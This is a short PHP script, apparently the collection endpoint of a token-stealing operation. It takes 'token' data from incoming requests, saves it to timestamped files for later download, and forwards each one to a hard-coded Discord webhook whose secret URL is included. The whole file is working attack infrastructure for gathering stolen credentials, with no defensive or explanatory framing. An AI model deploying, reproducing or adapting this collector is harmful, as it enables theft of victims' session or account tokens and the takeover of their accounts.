<?php
// log.php – Log incoming token data to a file and forward it to Discord

header('Content-Type: text/plain');

// 1️⃣ Grab the data from the query string (e.g. ?data=foo)
$data = $_GET['data'] ?? '';

if ($data) {
    // 2️⃣ Write to a timestamped file (for later download)
    $filename = "tokens_" . date('Y-m-d_H-i-s') . ".txt";
    file_put_contents($filename, $data . PHP_EOL . PHP_EOL, FILE_APPEND);

    // 3️⃣ Forward the same payload to Discord
    $webhook = 'https://discord.com/api/webhooks/1563428362553135104/tg0JKi984kJRddxhYo-VMFxAR8K3-A8nYPEz_kcOEqZK8UShRE7AhwZCiW-w3l2w53Yl';
    $payload = [
        'content' => '⚡ **New token received** ⚡',
        'embeds' => [
            [
                'title' => 'Token Payload',
                'description' => "```\n$data\n```",
                'color'  => 0x00FF00   // green
            ]
        ]
    ];

    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);

    // 4️⃣ Tell the browser that everything went OK
    echo "OK";
} else {
    echo "NO DATA";
}
?>
